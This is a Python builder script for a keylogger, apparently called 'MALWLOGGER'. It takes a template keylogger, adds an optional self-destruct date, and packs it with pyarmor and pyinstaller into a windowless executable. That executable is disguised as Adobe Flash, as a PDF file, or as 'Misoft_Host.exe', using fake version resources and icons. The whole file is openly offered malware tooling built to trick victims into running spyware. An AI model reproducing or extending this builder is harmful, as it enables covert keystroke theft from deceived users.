import os, sys
from datetime import datetime, timedelta
#Author TrG-1999
os.system('cls')
def set_destruction(namefile):
	chk = input("\nDo you want to add self-destruction [y/n] \n")
	if chk == "y" or chk == "Y":
		days = int(input("The number of days after you want this keylogger to self-destruct \n"))
		if days <= 0:
			print("Days should be greater than 0")
			os.system("del "+namefile)
			sys.exit()   
		else:
			tme = str(datetime.now() + timedelta(days))[:10]
			f = open(namefile,'r+')
			readcontent = f.read()
			f.seek(0, 0)
			f.write('dst= ' + "'" + tme + "'" + '\n' + readcontent)
			f.close()
	else:
		f = open(namefile,'r+')
		readcontent = f.read()
		f.seek(0, 0)
		f.write('dst= ' + "'None'" + '\n' + readcontent)
		f.close()

print("""
 ███▄ ▄███▓ ▄▄▄       ██▓     █     █░ ██▓     ▒█████    ▄████   ▄████ ▓█████  ██▀███  
▓██▒▀█▀ ██▒▒████▄    ▓██▒    ▓█░ █ ░█░▓██▒    ▒██▒  ██▒ ██▒ ▀█▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
▓██    ▓██░▒██  ▀█▄  ▒██░    ▒█░ █ ░█ ▒██░    ▒██░  ██▒▒██░▄▄▄░▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
▒██    ▒██ ░██▄▄▄▄██ ▒██░    ░█░ █ ░█ ▒██░    ▒██   ██░░▓█  ██▓░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
▒██▒   ░██▒ ▓█   ▓██▒░██████▒░░██▒██▓ ░██████▒░ ████▓▒░░▒▓███▀▒░▒▓███▀▒░▒████▒░██▓ ▒██▒
░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░▓  ░░ ▓░▒ ▒  ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
░  ░      ░  ▒   ▒▒ ░░ ░ ▒  ░  ▒ ░ ░  ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
░      ░     ░   ▒     ░ ░     ░   ░    ░ ░   ░ ░ ░ ▒  ░ ░   ░ ░ ░   ░    ░     ░░   ░ 
       ░         ░  ░    ░  ░    ░        ░  ░    ░ ░        ░       ░    ░  ░   ░     
""")
print("Choice#\n 1.Fake in Adobe Flash \n 2.Fake in PDF file \n 3.Default")
choice = input("type choice: ")

if choice == '1':
	os.system('copy template.py Flash.py')
	# os.system('pyinstaller --noconsole --version-file=Version/adobe.ver -i Icons/flash.ico malw_Flash.py --upx-dir=upx-3.96-win64/ -y --onefile')
	set_destruction("Flash.py")
	os.system('pyarmor pack --clean -e "--onefile --noconsole --version-file=Version/adobe.ver -i Icons/flash.ico" Flash.py')
	os.system('rmdir /S /Q build')
	os.system('del Flash.py')
	os.system('cls')
	print('Saved to: dist/Flash.exe')
elif choice == '2':
	os.system('copy template.py pdf.py')
	set_destruction("pdf.py")
	os.system('pyarmor pack --clean -e "--onefile --noconsole --version-file=Version/pdf.ver -i Icons/pdf.ico" pdf.py')
	os.system('rmdir /S /Q build')
	os.system('del pdf.py')
	os.system('cls')
	print('Saved to: dist/pdf.exe')
elif choice == '3':
	os.system('copy template.py Misoft_Host.py')
	set_destruction("Misoft_Host.py")
	os.system('pyarmor pack --clean -e "--onefile --noconsole --icon=NONE" Misoft_Host.py')
	os.system('rmdir /S /Q build')
	os.system('del Misoft_Host.py')
	os.system('cls')
	print('Saved to: dist/Misoft_Host.exe')
else:
	print("Choice not exist")
